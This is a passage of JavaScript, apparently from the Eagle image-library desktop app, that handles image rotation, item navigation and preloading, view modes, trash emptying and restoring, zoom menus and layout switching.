                            fse.copySync(rawPath, dest, { preserveTimestamps : true });
                            canvasHelper.rotate(destUrl, degree, rotatedImage.ext, function(result, w, h) {

                                if (!result) {
                                    rotatedImage.width = originalWidth;
                                    rotatedImage.height = originalHeight;
                                    $("#detail-image").css({
                                        "transform": `none`,
                                        "transition": "none"
                                    });
                                    $scope.isRotating = false;
                                    alert("Image rotation failed, reason: image resolution is too large.");
                                    fse.remove(dest);
                                    return;
                                }

                                [rotatedImage.width, rotatedImage.height] = [w, h];

                                $scope.updateItemView(rotatedImage);
                                $scope.relayout();
                                $scope.$evalAsync();

                                var buffer = decodeBase64Image(result).data;

                                // 写入前先备份，若发生失败要复原
                                fs.writeFile(dest, buffer, function(err) {
                                    $scope.isRotating = false;
                                    // $("#detail-image").data("degree", 0);
                                    if (!err) {
                                    	delete rotatedImage.orientation;
                                    	$scope.updateItemView(rotatedImage);
                                        fse.removeSync(rawPath);
                                        fse.copySync(dest, rawPath);
                                        fse.removeSync(dest);
                                        ipcRenderer.send('regenerate-thumbnail', [rotatedImage]);
                                        try { electronLog && electronLog.info(`[app] Rotate image: ${rotatedImage.name}(${rotatedImage.id})`); } catch (err) {};
                                    }
                                    else {
                                        fse.removeSync(dest);
                                    }
                                });
                            });
                        });
                    }
                    else {

						let dest = `${rawPath}_${Date.now()}`;
                        let destUrl = URL_MODULE.pathToFileURL(dest).href;

						// JPG 格式優先使用 EXIF 方式旋轉
						// 若失敗，則使用原來強制旋轉方法
						if (rotatedImage.ext === 'jpg') {
							try {
								// Rotate by EXIF
								const rotateImage = require(appRoot.path + '/app/js/utils/rotateImage.js');
								await rotateImage(rawPath, degree);
                                $scope.isRotating = false;
								ipcRenderer.send('regenerate-thumbnail', [rotatedImage]);
								$scope.$evalAsync();
								return;
							}
							catch (err) {
								electronLog && electronLog.error(err.stack || err);
							}
						}
                        
                        fse.copySync(rawPath, dest, { preserveTimestamps : true });
                        canvasHelper.rotate(destUrl, degree, rotatedImage.ext, function(result, w, h) {

                            if (!result) {
                                rotatedImage.width = originalWidth;
                                rotatedImage.height = originalHeight;
                                $("#detail-image").css({
                                    "transform": `none`,
                                    "transition": "none"
                                });
                                $scope.isRotating = false;
                                alert("Image rotation failed, reason: image resolution is too large.");
                                fse.remove(dest);
                                return;
                            }

                            [rotatedImage.width, rotatedImage.height] = [w, h];
                            $scope.updateItemView(rotatedImage);
                            $scope.relayout();
                            $scope.$evalAsync();

                            var buffer = decodeBase64Image(result).data;

                            // 写入前先备份，若发生失败要复原
                            fs.writeFile(dest, buffer, function(err) {
                                // $("#detail-image").data("degree", 0);
                                $scope.isRotating = false;
                                if (!err) {
                                	delete rotatedImage.orientation;
                                	$scope.updateItemView(rotatedImage);
                                    fse.removeSync(rawPath);
                                    fse.copySync(dest, rawPath);
                                    fse.removeSync(dest);
                                    ipcRenderer.send('regenerate-thumbnail', [rotatedImage]);
                                    try { electronLog && electronLog.info(`[app] Rotate image: ${rotatedImage.name}(${rotatedImage.id})`); } catch (err) {};
                                }
                                else {
                                    fse.removeSync(dest);
                                }
                            });
                        });
                    }
                }
                else {
                    $scope.isRotating = false;
                }
            }, 2000);
        };

        $scope.getNext = function () {
            var selection = $scope.getSelection();
            var start = selection.start;
            var end = selection.end;
            return $scope.allData[end + 1] || $scope.allData[end - 1];
        }

        var nextTimeout;
        $scope.selectNext = function(event) {

            if ($scope.isCropMode) {
                $rootScope.$broadcast("MOVE-CROP-TOOL", { horizontal: 1, vertical: 0 });
                return;
            }

            var selection = $scope.getSelection();
            var start = selection.start;
            var end = selection.end + 1;

            if ($scope.isDetailMode) {
                $scope.rememberScrollTops($scope.current);
            }

            if (!$scope.allData[end]) {
                $("#is-last-item").show();
                setTimeout(() => { $("#is-last-item").hide(); }, 500);
                return;
            }
            else {
                $("#detail-container").smoothZoom('cleanBitmapViewer');
            }

            $scope.selected = [$scope.allData[end]];
            $scope.selectedFolderMappings = {};
            $rootScope.currentFocus = "content";

            if ($scope.isDetailMode) {
                $timeout.cancel(nextTimeout);
                $scope.forceFitImageSize($scope.selected[0], true);
                $scope.current = $scope.selected[0];
                $scope.isGifReady = false;
            }

            autoScroll(end);

            if ($scope.current) {
                $("#detail-container").smoothZoom('updateNavigator', $bodyScope.current);
                if (!$scope.lastZoom()) {
                    $scope.zoom();
                }
                nextTimeout = $timeout(function () {
                    if (!$scope.lastZoom()) {
                        $scope.zoom();
                    }
                    var nextImage = $scope.allData[end + 1];
                    $scope.preloadImage("next");
                }, 100);
                $scope.addToRecentFile($scope.current);
            }
        };

        $scope.addToRecentFile = function (item) {
            // 記錄在最近使用
            setTimeout(function () {
                if ($scope.current !== item) {
                    console.log("已換人，無須記錄")
                }
                else {
                    console.log(`添加 ${item.id} 至最近使用`)
                    RecentFileManager.addFile(item);
                }
            }, 1000);
        };

        var preloadImageTimeout;
        $scope.preloadImage = function (mode) {
            const supportFoamts = {
                "jpg": true,
                "jpeg": true,
                "png": true,
                "webp": true,
                "avif": true,
                "insp": true,
                "jfif": true,
                "jpe": true,
                "jxl": true,
                "bmp": true,
            };
            clearTimeout(preloadImageTimeout);
            preloadImageTimeout = setTimeout(function () {
                const idx = $scope.currentIndex();
                const nextImage = $scope.allData[idx];
                const preImage = $scope.allData[idx - 2];
                if (mode === "next") {
                    if (nextImage && supportFoamts[nextImage?.ext]) {
                        $("#detail-container").smoothZoom('preload', nextImage);
                    }
                }
                else {
                    if (preImage && supportFoamts[preImage?.ext]) {
                        $("#detail-container").smoothZoom('preload', preImage);
                    }
                }
            }, 100);
        };

        // 降低圖片左右切换瞬间的闪烁感，如果尺寸相图，就不需隐藏，因为这不会造成任何闪烁
        $scope.forceFitImageSize = function (image, usingThumbnail) {
            if (!image) return;
            if (!$scope.isDetailMode) return;
            if ($("#detail-image").length === 0) return;
            $("#detail-image")
                .css({
                    width: image.width,
                    height: image.height,
                    transition: 'none'
                });
            if (usingThumbnail) {
            	if (image.orientation && image.orientation !== 1) {
            		$("img#detail-image").attr("src", $bodyScope.getRawUrl(image));
            	}
            	else {
            		$("img#detail-image").attr("src", FileUrlHelper.getThumbnailUrl(image));
            	}
            }
        };

        var prevTimeout;
        $scope.selectPrev = function(event) {

            if ($scope.isCropMode) {
                $rootScope.$broadcast("MOVE-CROP-TOOL", { horizontal: -1, vertical: 0 });
                return;
            }

            var selection = $scope.getSelection();
            var start = selection.start;
            var end = selection.end + 1;

            if (start === 0) { 
                $("#is-first-item").show();
                setTimeout(() => { $("#is-first-item").hide(); }, 500);
                return; 
            }
            if ($scope.allData.length == 0) { return; }

            if ($scope.isDetailMode) {
                $("#detail-container").smoothZoom('cleanBitmapViewer');
                $scope.rememberScrollTops($scope.current);
                $scope.isGifReady = false;
            }

            if ($scope.allData[start - 1]) {
                $scope.selected = [];
                $scope.selected.push($scope.allData[start - 1]);
                if ($scope.isDetailMode) {
                    $scope.forceFitImageSize($scope.selected[0], true);
                    $scope.current = $scope.selected[0];
                }
                autoScroll(start - 1);
            } else {
                $scope.selected = [];
                $scope.selected.push($scope.allData[0]);
                $scope.forceFitImageSize($scope.selected[0], true);
                $scope.current = $scope.selected[0];
                autoScroll(0);
            }
            $scope.selectedFolderMappings = {};
            $rootScope.currentFocus = "content";
            if ($scope.current) {
                $("#detail-container").smoothZoom('updateNavigator', $bodyScope.current);
                if (!$scope.lastZoom()) {
                    $scope.zoom();
                }
                $timeout.cancel(prevTimeout);
                prevTimeout = $timeout(function () {
                    if (!$scope.lastZoom()) {
                        $scope.zoom();
                    }
                    $scope.preloadImage("prev");
                }, 100)
                $scope.addToRecentFile($scope.current);
            }
        };

        $scope.multipleSelectNext = function(event) {
            if ($rootScope.currentFocus == 'sidebar') return;
            if ($scope.isCropMode) {
                $rootScope.$broadcast("MOVE-CROP-TOOL", { horizontal: 10, vertical: 0 });
                return;
            }
            if ($scope.isDetailMode) return;
            var selection = $scope.getSelection();
            var start = selection.start;
            var end = selection.end + 1;

            if (start < $scope.lastSelectedIndex) {
                let startItem = $scope.allData[start];
                let idx = $scope.selected.indexOf(startItem);
                if (idx !== -1) {
                    $scope.selected.splice(idx, 1);
                    autoScroll($scope.lastSelectedIndex);
                }
            }
            else {
                if ($scope.allData[end]) {
                    $scope.selected.push($scope.allData[end]);
                    autoScroll(end);
                }
            }
        };

        $scope.multipleSelectPrev = function(event) {
            if ($rootScope.currentFocus == 'sidebar') return;
            if ($scope.isCropMode) {
                $rootScope.$broadcast("MOVE-CROP-TOOL", { horizontal: -10, vertical: 0 });
                return;
            }
            if ($scope.isDetailMode) return;
            var selection = $scope.getSelection();
            var start = selection.start;
            var end = selection.end;

            if (end > $scope.lastSelectedIndex) {
                let endItem = $scope.allData[end];
                let idx = $scope.selected.indexOf(endItem);
                if (idx !== -1) {
                    $scope.selected.splice(idx, 1);
                    autoScroll($scope.lastSelectedIndex);
                }
            }
            else {
                if ($scope.allData[start - 1]) {
                    $scope.selected.push($scope.allData[start - 1]);
                    autoScroll(start - 1);
                }
            }            
        };

        $scope.isSeleted = function(image) {
            return $scope.selected.indexOf(image) != -1;
        };

        $scope.boxStyle = function (image) {
            var width = parseInt(image.width * $scope.imageSize.height / $scope.boxHeight(image));
            return 'width:' + width + 'px;' + 'flex-grow:' + width;
        };

        $scope.boxHeight = function(image) {
            if (image.ext == 'svg') {
                return Math.max(image.width, image.height);
            }
            if (image.height / image.width > 2 && image.width > 640) {
                return image.width * 2;
            }
            return image.height;
        };

        $scope.getSelection = function() {
            var arr = [];
            $scope.selected.forEach(function(image) {
                var idx = $scope.allData.indexOf(image);
                if (idx != -1) {
                    arr.push(idx);
                }
            });
            var invert = arr[0] > arr[1];
            arr = arr.sort(function(a, b) {
                return a - b;
            });
            return {
                start: arr[0],
                end: arr[arr.length - 1],
                invert: invert
            }
        };

        $scope.selectionStart = function(event, ui) {
            event && event.stopPropagation();
        };
        $scope.selectionStop = function(selected) {};

        $scope.changeSidebarIndex = function (node) {
            const folder = $scope.folderMappings[node?.id];
            const idx = $scope.sidebarList.indexOf(folder);
            if (idx !== -1) {
                $scope.sidebarIndex = -1;
                $timeout(function () {
                    $scope.sidebarIndex = idx; 
                }, 1);
            }
        };

        $scope.resetPage = function () {

            // Note: 切换文件夹时，强制触发 inspector 输入框先进行 change
            document.activeElement.blur();
            $rootScope.$broadcast("RESET_PAGE");
            $scope.listDone = false;
            setTimeout(() => {ig.clear();}, 40);
            $scope.isOpenWebpagePanel = false;
            $scope.currentTag = undefined;
            $scope.startCursor = 0;
            $scope.currentFolder = undefined;
            eagle.inspector.reset();
            $scope.currentFolderChildren = undefined;
            $scope.currentSmartFolder = undefined;
            $rootScope.selectedFoldersMappings = {};
            $rootScope.selectedFolders = [];
            $scope.selectedFolderMappings = {};
            $rootScope.selectedSmartFoldersMappings = {};
            $rootScope.selectedSmartFolders = [];
            $scope.currentId = undefined;
			$scope.layout = localStorage.getItem(`eagle.list.layout.${$scope.rootDir}`) || localStorage.getItem("eagle.list.layout") || "JustifiedLayout";

            if (!eagle.filter.isLock) {
                $scope.resetFilter();
                $scope.keyword = undefined;
            }
            $("#image-drop-area").hide();

            if ($scope.duplicateTarget) {
                $scope.duplicateTarget = undefined;
                $scope.findDupclipate(undefined);
            }
        };

        var openAllTimeout;
        $scope.openAll = function(ignoreHistory, callback) {

            if ($scope.viewMode === 'all' && $scope.allData.length > 0 && eagle.filter.filterRules.color.value == undefined) {
                if (callback) {
                    callback();
                }
                if ($scope.isDetailMode) {
                    $scope.leaveDetailMode();
                }
                return;
            }

            ScrollbarSaver.saveScrollPosition();

            $scope.viewMode = 'all';
            $rootScope.currentFocus = "sidebar";
            $scope.resetPage();

            if (!ignoreHistory) {
                $scope.addNavigationHistory({ type: "all" });
            }

            $timeout.cancel(openAllTimeout);
            openAllTimeout = $timeout(function() {
                $scope.imageSize.height = localStorage.getItem("eagle.list.thumbSize.all") || 150;
                $scope.imageSize.height = parseInt($scope.imageSize.height);
                setLastFolder(undefined);
                updateListHeight($scope.imageSize.height);
                ScrollbarSaver.restoreScrollPosition();
                $("#sidebar-item-container").scrollTop(0);
                $scope.reload();
                if (callback) {
                    callback();
                }
                analytics.screenView('All');
            }, 50);
        };

        var openRandomTimeout;
        $scope.openRandom = function(ignoreHistory, callback) {
            if ($scope.viewMode === 'random' && $scope.allData.length > 0 && eagle.filter.filterRules.color.value == undefined) {
                if (callback) {
                    callback();
                }
                if ($scope.isDetailMode) {
                    $scope.leaveDetailMode();
                }
                return;
            }
            
            $scope.viewMode = 'random';
            $scope.resetPage();
            $rootScope.currentFocus = "sidebar";
            
            if (!ignoreHistory) {
                $scope.addNavigationHistory({ type: "random" });
            }
            $("#image-drop-area").hide();
            $timeout.cancel(openRandomTimeout);
            openRandomTimeout = $timeout(function() {
                $scope.imageSize.height = localStorage.getItem("eagle.list.thumbSize.random") || 150;
                $scope.imageSize.height = parseInt($scope.imageSize.height);
                setLastFolder(undefined);
                $("#sidebar-item-container").scrollTop(0);
                $scope.reload();
                if (callback) {
                    callback();
                }
                analytics.screenView('Random');
            }, 50);
        };

        var openUnfiledTimeout;
        $scope.openUnfiled = function(ignoreHistory) {

            if ($scope.viewMode === 'unfiled' && $scope.allData.length > 0 && eagle.filter.filterRules.color.value == undefined) {
                if ($scope.isDetailMode) {
                    $scope.leaveDetailMode();
                }
                return;
            }

            ScrollbarSaver.saveScrollPosition();
            $scope.viewMode = 'unfiled';
            $rootScope.currentFocus = "sidebar";
            $scope.resetPage();

            if (!ignoreHistory) {
                $scope.addNavigationHistory({ type: "unfiled" });
            }

            $timeout.cancel(openUnfiledTimeout);
            openUnfiledTimeout = $timeout(function() {
                $scope.imageSize.height = localStorage.getItem("eagle.list.thumbSize.unfiled") || 150;
                $scope.imageSize.height = parseInt($scope.imageSize.height);
                setLastFolder(undefined);
                updateListHeight($scope.imageSize.height);
                ScrollbarSaver.restoreScrollPosition();
                $("#sidebar-item-container").scrollTop(0);
                $scope.reload();
                analytics.screenView('Unfiled');
            }, 50);
        };

        var openUntaggedTimeout;
        $scope.openUntagged = function(ignoreHistory) {

            if ($scope.viewMode === 'untagged' && $scope.allData.length > 0 && eagle.filter.filterRules.color.value == undefined) {
                if ($scope.isDetailMode) {
                    $scope.leaveDetailMode();
                }
                return;
            }

            ScrollbarSaver.saveScrollPosition();
            $scope.viewMode = 'untagged';
            $rootScope.currentFocus = "sidebar";
            $scope.resetPage();

            if (!ignoreHistory) {
                $scope.addNavigationHistory({ type: "untagged" });
            }

            $timeout.cancel(openUntaggedTimeout);
            openUntaggedTimeout = $timeout(function() {
                $scope.imageSize.height = localStorage.getItem("eagle.list.thumbSize.untagged") || 150;
                $scope.imageSize.height = parseInt($scope.imageSize.height);
                setLastFolder(undefined);
                updateListHeight($scope.imageSize.height);
                ScrollbarSaver.restoreScrollPosition();
                $("#sidebar-item-container").scrollTop(0);
                $scope.reload();
                analytics.screenView('Untagged');
            }, 50);
        };

        var openRecentTimeout;
        $scope.openRecent = function(ignoreHistory) {

            if ($scope.viewMode === 'recent' && $scope.allData.length > 0 && eagle.filter.filterRules.color.value == undefined) {
                if ($scope.isDetailMode) {
                    $scope.leaveDetailMode();
                }
                return;
            }

            ScrollbarSaver.saveScrollPosition();
            $scope.viewMode = 'recent';
            $rootScope.currentFocus = "sidebar";
            $scope.resetPage();

            if (!ignoreHistory) {
                $scope.addNavigationHistory({ type: "recent" });
            }

            $timeout.cancel(openRecentTimeout);
            openRecentTimeout = $timeout(function() {
                $scope.imageSize.height = localStorage.getItem("eagle.list.thumbSize.recent") || 150;
                $scope.imageSize.height = parseInt($scope.imageSize.height);
                setLastFolder(undefined);
                updateListHeight($scope.imageSize.height);
                ScrollbarSaver.restoreScrollPosition();
                $("#sidebar-item-container").scrollTop(0);
                $scope.reload();
                analytics.screenView('Recent');
            }, 50);
        };

        $scope.openCommunity = function (ignoreHistory) {
            ScrollbarSaver.saveScrollPosition();
            $scope.viewMode = 'community';
            $rootScope.currentFocus = "sidebar";
            $scope.resetPage();
            $scope.images = [];
            $scope.isDetailMode = false;
            $scope.selected = [];

            if (!ignoreHistory) {
                $scope.addNavigationHistory({ type: "community" });
            }

            let lng2locale = {
                "zh_CN": "cn",
                "zh_TW": "tw",
                "ja_JP": "jp"
            };
            let baseUrl = `https://community-${lng2locale[preferences.general.language] || "en"}.eagle.cool`;
            $rootScope.$broadcast("OPEN_URL_IN_PANEL", `${baseUrl}`);
            $bodyScope.leaveDetailMode();
        };

        $scope.openAllTags = function(ignoreHistory) {
            if ($scope.viewMode === 'alltags' && $scope.allData.length > 0 && eagle.filter.filterRules.color.value == undefined) return;

            ScrollbarSaver.saveScrollPosition();

            $scope.viewMode = 'alltags';
            $rootScope.currentFocus = "sidebar";
            $scope.resetPage();
            $scope.images = [];
            $scope.isDetailMode = false;
            $scope.selected = [];

            if (!ignoreHistory) {
                $scope.addNavigationHistory({ type: "alltags" });
            }

            $scope.rebindRefresh();
            analytics.screenView('AllTags');
            $timeout(() => {
                TagManager.renderTagsResult();
            }, 50);
        };

        $scope.scrollToTagGroup = function(group) {
            var $current = $("#tag-group-" + group.name);
            var offsetTop = $("#tag-manager .tag-manager-container").height() / 2 - $current.height() / 2;
            $("#tag-manager .tag-manager-container").scrollTo($current, 200, {
                axis: 'y',
                offset: {
                    top: -offsetTop,
                }
            });
        };

        $scope.openErrorModal = function () {
            $rootScope.$broadcast("OPEN_ERROR", {
                errorList: $scope.errorList
            });
        };

        $scope.cleanLocalhostError = function (event) {
            $scope.localhostError = false;
        };

        $scope.cleanLibraryPathPermissionError = function (event) {
            $scope.libraryPathPermissionError = false;
        };

        $scope.cleanAllError = function (event) {
            event && event.stopPropagation();
            $rootScope.$broadcast("CLEAN_ALL_ERROR", {
                errorList: $scope.errorList
            });
        };

        $scope.openDuplicate = function(options = {}) {
            if (options?.selected) {
                $rootScope.$broadcast("OPEN_DUPLICATE_SCAN_PANEL", {
                    items: [...$scope.selected],
                });
            }
            else if (options?.currentPage) {
                $rootScope.$broadcast("OPEN_DUPLICATE_SCAN_PANEL", {
                    items: [...$scope.allData],
                });
            }
            else {
                $rootScope.$broadcast("OPEN_DUPLICATE_SCAN_PANEL", {
                    items: [...$scope.all],
                });
            }
        };

        var openTrashTimeout;
        $scope.openTrash = function(ignoreHistory) {
            if ($scope.viewMode === 'trash' && $scope.allData.length > 0 && eagle.filter.filterRules.color.value == undefined) {
                if ($scope.isDetailMode) {
                    $scope.leaveDetailMode();
                }
                return;
            }
            ScrollbarSaver.saveScrollPosition();

            $scope.viewMode = 'trash';
            $scope.resetPage();
            $rootScope.currentFocus = "sidebar";

            if (!ignoreHistory) {
                $scope.addNavigationHistory({ type: "trash" });
            }
            $("#image-drop-area").hide();
            $timeout.cancel(openTrashTimeout);
            openTrashTimeout = $timeout(function() {
                $scope.imageSize.height = localStorage.getItem("eagle.list.thumbSize.trash") || 150;
                $scope.imageSize.height = parseInt($scope.imageSize.height);
                setLastFolder(undefined);
                updateListHeight($scope.imageSize.height);
                ScrollbarSaver.restoreScrollPosition();
                $("#sidebar-item-container").scrollTop(0);
                $scope.reload();
                analytics.screenView('Trash');
            }, 50);
        };

        ipcRenderer.on('remove-trash-item', function(e) {
            $scope.currentTrashRemoved++;
            $scope.removeProgress = $scope.currentTrashRemoved / $scope.trashRemoved * 100;
            $scope.removeProgress = ($scope.removeProgress > 100) ? 100 : $scope.removeProgress;
            $scope.$evalAsync();
            if ($scope.currentTrashRemoved >= $scope.trashRemoved || $scope.removeProgress > 98) {
                $scope.isCleaningTrash = false;
                $scope.trashRemoved = 0;
                $scope.currentTrashRemoved = 0;
                IPCHelper.send('palette-resume');
                $scope.$evalAsync();
            }
        });
        $scope.trashRemoved = 0;
        $scope.emptyTrash = function() {
            if ($scope.trash && $scope.trash.length > 0) {
                swal({
                    html: `
                        <div class="alert">
                            <div class="alert-icon warning"></div>
                            <h4 class="alert-title">${i18n.__('dialog.emptyTrash.title')}</h4>
                            <p class="alert-desc">${i18n.__("dialog.emptyTrash.desc")}</p>
                        </div>
                    `,
                    showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: false, focusCancel: false, padding: 24,
                    width: 400,
                    customClass: "alert-box",
                    cancelButtonColor: "#777777",
                    confirmButtonText: i18n.__('dialog.emptyTrash.button'),
                    cancelButtonText: i18n.__("general.cancel"),
                }).then(function () {

                    var removeCount = $scope.trash.length;

                    var willDelete = {};
                    $scope.trash.forEach(function(r) {
                        if (r.id) {
                            willDelete[r.id] = true;
                        }
                    });

                    for (var i = 0; i < $scope.raw.length; i++) {
                        var image = $scope.raw[i];
                        if (image.id && willDelete[image.id]) {
                            $scope.raw.splice(i, 1);
                            delete $scope.itemMappings[image.id];
                            i--;
                            continue;
                        }
                    }

                    try { electronLog && electronLog.info(`[app] Empty trash`); } catch (err) {};
                    ayncsImagesRemove($scope.trash);

                    $scope.trash = [];
                    $scope.updateSelection();
                    $scope.rebindRefresh();
                    $scope.findDupclipate(undefined);

                    // 更新進度
                    $scope.removeProgress = 0;
                    $scope.currentTrashRemoved = 0;
                    $scope.trashRemoved += removeCount;
                    $scope.isCleaningTrash = true;

                    // 如果声音效果是开启的
                    if ($rootScope.preferences.notification.soundEffect.enable != 'false' && $rootScope.preferences.notification.soundEffect.when.deleteFolder == 'true') {
                        $scope.removeSound.play();
                    }
                });
            }
        };

        $scope.removePermanently = function() {
            if ($scope.viewMode !== "trash") { return; };
            var images = $scope.selected;

            images.forEach(function(r) {
                var idx = $scope.raw.indexOf(r);
                if (idx != -1) {
                    $scope.raw.splice(idx, 1);
                }
            });

            ayncsImagesRemove(images);

            var itemElements = $scope.getSelectedItemElements();
            $rootScope.$broadcast("gl:removeItems", itemElements);
            $scope.selected = [];
            $scope.calculateImageBinding({ ignoreSort: true }, function() {
                $scope.rebindRefresh(true);
                $scope.updateSelection();
            });
        };

        $scope.emptyRestore = function() {
            if ($scope.trash && $scope.trash.length > 0) {
                swal({
                    html: `
                        <div class="alert">
                            <div class="alert-icon warning"></div>
                            <h4 class="alert-title">${i18n.__('dialog.restoreAll.title')}</h4>
                            <p class="alert-desc">${i18n.__('dialog.restoreAll.desc')}</p>
                        </div>
                    `,
                    showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: false, focusCancel: false, padding: 24,
                    width: 400,
                    customClass: "alert-box",
                    cancelButtonColor: "#777777",
                    confirmButtonText: i18n.__('dialog.restoreAll.button'),
                    cancelButtonText: i18n.__("general.cancel"),
                }).then(function () {
                    var changes = [];
                    let now = Date.now();
                    $scope.trash.forEach(function(image) {
                        image.isDeleted = false;
                        changes.push(image);
                        $scope.updateFilterCounts(image, -1, now);
                        // ipcRenderer.send('image-change', image);
                    });
                    if (changes.length > 0) {
                        ayncsImagesChange(changes);
                        try { electronLog && electronLog.info(`[app] Restore ${changes.length} files from trash`); } catch (err) {};
                    }
                    $scope.trash = [];
                    
                    $scope.calculateImageBinding({ ignoreSort: true }, function() {
                        $scope.rebindRefresh();
                        $scope.updateSelection();
                        $scope.$evalAsync();
                    });
                });
            }
        };

        $scope.toggleRatioContextMenu = function($event) {
            $event.stopPropagation();
            if ($scope.imageSize.zoomRatio != 100) {
                $scope.zoomActual();
            } else {
                $scope.zoom();
            }
        };

        $scope.openGifContextMenu = () => {
            ContextMenu.open({
                items: [
                    { 
                        label: i18n.__("context.gifViewer.setThumbnail"), 
                        icon: 'ic-set-thumbnail.svg',
                        click: () => { 
                            $scope.gifViewer.setThumbnail();
                            $scope.$evalAsync(); 
                        } 
                    },
                    { 
                        disabled: !($scope.gifViewer.range !== undefined),
                        label: i18n.__("context.gifViewer.cancelRange"), 
                        icon: 'ic-reset-range.svg',
                        click: () => { 
                            $scope.gifViewer.cancelRange();
                            $scope.$evalAsync(); 
                        } 
                    }
                ],
                showSearch: false,
            });
        };

        $scope.openRatioContextMenu = function() {
            ContextMenu.open({
                items: [
                    { label: '5%', checked: parseInt($scope.imageSize.zoomRatioExp) == 5, click: () => { $scope.updateZoomRatio($scope.getRatioNonExp(5), undefined, undefined, true); $scope.imageSize.zoomRatioExp = 5; $scope.$evalAsync(); } },
                    { label: '10%', checked: parseInt($scope.imageSize.zoomRatioExp) == 10, click: () => { $scope.updateZoomRatio($scope.getRatioNonExp(10), undefined, undefined, true); $scope.imageSize.zoomRatioExp = 10; $scope.$evalAsync(); } },
                    { label: '25%', checked: parseInt($scope.imageSize.zoomRatioExp) == 25, click: () => { $scope.updateZoomRatio($scope.getRatioNonExp(25), undefined, undefined, true); $scope.imageSize.zoomRatioExp = 25; $scope.$evalAsync(); } },
                    { label: '50%', checked: parseInt($scope.imageSize.zoomRatioExp) == 50, click: () => { $scope.updateZoomRatio($scope.getRatioNonExp(50), undefined, undefined, true); $scope.imageSize.zoomRatioExp = 50; $scope.$evalAsync(); } },
                    { label: '100%', checked: parseInt($scope.imageSize.zoomRatioExp) == 100, click: () => { $scope.updateZoomRatio($scope.getRatioNonExp(100), undefined, undefined, true); $scope.imageSize.zoomRatioExp = 100; $scope.$evalAsync(); } },
                    { label: '125%', checked: parseInt($scope.imageSize.zoomRatioExp) == 125, click: () => { $scope.updateZoomRatio($scope.getRatioNonExp(125), undefined, undefined, true); $scope.imageSize.zoomRatioExp = 125; $scope.$evalAsync(); } },
                    { label: '150%', checked: parseInt($scope.imageSize.zoomRatioExp) == 150, click: () => { $scope.updateZoomRatio($scope.getRatioNonExp(150), undefined, undefined, true); $scope.imageSize.zoomRatioExp = 150; $scope.$evalAsync(); } },
                    { label: '200%', checked: parseInt($scope.imageSize.zoomRatioExp) == 200, click: () => { $scope.updateZoomRatio($scope.getRatioNonExp(200), undefined, undefined, true); $scope.imageSize.zoomRatioExp = 200; $scope.$evalAsync(); } },
                    { label: '300%', checked: parseInt($scope.imageSize.zoomRatioExp) == 300, click: () => { $scope.updateZoomRatio($scope.getRatioNonExp(300), undefined, undefined, true); $scope.imageSize.zoomRatioExp = 300; $scope.$evalAsync(); } },
                    { label: '400%', checked: parseInt($scope.imageSize.zoomRatioExp) == 400, click: () => { $scope.updateZoomRatio($scope.getRatioNonExp(400), undefined, undefined, true); $scope.imageSize.zoomRatioExp = 400; $scope.$evalAsync(); } },
                    { label: '800%', checked: parseInt($scope.imageSize.zoomRatioExp) == 800, click: () => { $scope.updateZoomRatio($scope.getRatioNonExp(800), undefined, undefined, true); $scope.imageSize.zoomRatioExp = 800; $scope.$evalAsync(); } },
                    { role: 'separator' },
                    { label: i18n.__('context.zoom.zoomActural'), accelerator: 'CmdOrCtrl+0', click: () => { $scope.zoomActual(); $scope.$evalAsync(); } },
                    { label: i18n.__('context.zoom.zoomFit'), accelerator: 'CmdOrCtrl+9', click: () => { $scope.zoomFit(); $scope.$evalAsync(); } },
                ],
                showSearch: false,
            });            
        };

        $scope.togglePaletteProcessing = function () {
            if ($scope.paletteQueuePaused) {
                $scope.resumePalette();
            }
            else {
                $scope.pausePalette();
            }
        };

        $scope.pausePalette = function () {
            $scope.paletteQueuePaused = true;
            $("#background-state-spinner .sm-spiner").removeClass("has-animation");
            IPCHelper.send('change-palette-pause');
        };

        $scope.resumePalette = function () {
            $scope.paletteQueuePaused = false;
            $("#background-state-spinner .sm-spiner").addClass("has-animation");
            IPCHelper.send('change-palette-resume');
        };

        $scope.openLibrary = function (libPath) {
            var showAlert = $scope.isLibrarySaving ||  $scope.uploadQueue.length > 0 || $scope.downloadQueueLength > 0 || $scope.metadataQueueLength > 0 || $scope.isCleaningTrash || $scope.isImporting || $(".progress-dialog.open").not(".library-loading-dialog").length > 0 || $("#saving-progress-bar.open").length > 0;
            if (showAlert) {
                swal({
                    html: `
                        <div class="alert">
                            <div class="alert-icon warning"></div>
                            <h4 class="alert-title">${i18n.__('Dialog.BeforeSwitchLibrary.Title')}</h4>
                            <p class="alert-desc">${i18n.__("Dialog.BeforeSwitchLibrary.Descript")}</p>
                        </div>
                    `,
                    showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                    width: 400,
                    customClass: "alert-box",
                    cancelButtonColor: "#777777",
                    confirmButtonText: i18n.__("Dialog.BeforeSwitchLibrary.Quit"),
                    cancelButtonText: i18n.__("general.cancel"),
                    icon: "success"
                }).then(function () {
                    // 取消所有任务
                    $scope.cancelAllTasks();
                    ipcRenderer.send('add-to-history-and-open', libPath);
                });
            }
            else {
                ipcRenderer.send('add-to-history-and-open', libPath);
            }
        };

        $scope.openApplicationContextMenu = function() {
            var applicationMenu = Menu.getApplicationMenu();
            applicationMenu.popup(currentWindow);
        };

        $scope.openMergeImageContextMenu = function (event) {
            openMergeImages('vertical');
        }

        $scope.openMergeModalHorizontal = function () {
            openMergeImages('horizontal');
        }

        function openMergeImages (orientation) {
            if ($scope.selected.length > 1) {
                $rootScope.$broadcast("OPEN_MERGE_IMAGES", {
                    images: $scope.selected,
                    orientation: orientation
                });
            }
        }

        $scope.$watch("listMetaType", (type) => {
            $scope.changeMetaItems(type);
        });

        $scope.changeMetaItems = function (type) {
        	$scope.listMetaType = type;
            localStorage.setItem("eagle.list.meta.type", $scope.listMetaType);
            $scope.updateItemsView($scope.allData);
            electronLog && electronLog.info(`[app] Change list display info: ${$scope.listMetaType}`);
        }

		$scope.saveLayout = function (folder, layout) {
			if (folder) {
				localStorage[`eagle.list.layout.${folder.id}`] = layout;
			}
			else {
				localStorage[`eagle.list.layout.${$scope.rootDir}`] = layout;
			}
		};

        $scope.switchGridLayout = function () {
            $scope.switchLayout("GridLayout");
            $scope.$evalAsync();
            $scope.saveLayout($scope.currentFolder || $scope.currentSmartFolder, "GridLayout");
        }

        $scope.switchJustifiedLayout = function () {
            $scope.switchLayout("JustifiedLayout");
            $scope.$evalAsync();
